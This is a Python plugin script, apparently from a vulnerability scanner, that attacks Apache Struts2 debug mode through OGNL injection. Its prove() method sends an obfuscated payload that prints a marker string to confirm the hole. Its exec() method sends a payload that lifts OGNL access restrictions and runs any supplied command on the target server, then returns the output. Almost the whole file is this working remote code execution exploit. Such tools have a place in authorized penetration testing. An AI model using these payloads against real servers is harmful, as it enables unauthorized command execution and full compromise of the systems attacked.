#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            prove_poc = '''debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22struts2_security_%22),%23resp.getWriter().print(%22check%22),%23resp.getWriter().flush(),%23resp.getWriter().close()'''
            poc_key = "struts2_security_check"
            async with ClientSession() as session:
                headers = {'Content-Type': "application/x-www-form-urlencoded"}
                try:
                    async with session.post(url=self.url, data=prove_poc, headers=headers) as res:
                        if res:
                            text = await res.text()
                            if poc_key in res.headers or poc_key in text:
                                yield self.url
                except:
                    pass

    async def exec(self):
        if self.base_url:
            cmd = self.parameter['cmd']
            exec_poc =  '''debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22%COMMAND%%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()'''
            headers = {}
            async with ClientSession() as session:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                try:
                    async with session.post(url=self.url, data=exec_poc.replace("%COMMAND%", cmd), headers=headers)as res:
                        if res:
                            text = await res.text()
                            yield text
                except:
                    pass